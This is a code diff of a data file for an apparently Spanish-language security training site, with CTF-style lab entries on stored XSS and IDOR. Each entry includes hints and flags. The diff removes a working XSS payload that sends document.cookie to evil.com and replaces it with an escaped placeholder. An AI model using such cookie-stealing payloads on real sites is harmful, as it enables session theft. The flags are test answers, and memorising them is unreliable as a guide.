@@ -92,7 +92,7 @@ const LABS = [
     {id:"L014",title:"XSS Persistente",desc:"XSS que se guarde en la base de datos",diff:"intermedio",cat:"web",xp:200,
      hints:["Payload en campo perfil","Cookie stealing","Almacenar en DB"],
      challenge:"Inyecta XSS que se guarde y ejecute para todos los usuarios.",flag:"flag{xss_p3rs1st3nt}",
-     terminal:{prompt:"attacker@xss:~$",commands:["<img src=x onerror='fetch(\"http://evil.com/\"+document.cookie)'>","Payload guardado en perfil","Cuando Juan visita perfil...","Cookie de Juan: session_juan_xyz","flag{xss_p3rs1st3nt}"]}},
+     terminal:{prompt:"attacker@xss:~$",commands:["[XSS] &lt;img src=x onerror='fetch(evil.com+cookie)'&gt;","Payload guardado en perfil","Cuando Juan visita perfil...","Cookie de Juan: session_juan_xyz","flag{xss_p3rs1st3nt}"]}},
     {id:"L015",title:"IDOR Vulnerability",desc:"Insecure Direct Object Reference",diff:"intermedio",cat:"web",xp:150,
      hints:["Cambia ID en URL","IDs secuenciales","API endpoints"],
      challenge:"Accede al perfil de otro usuario cambiando el ID.",flag:"flag{1d0r_f0und}",
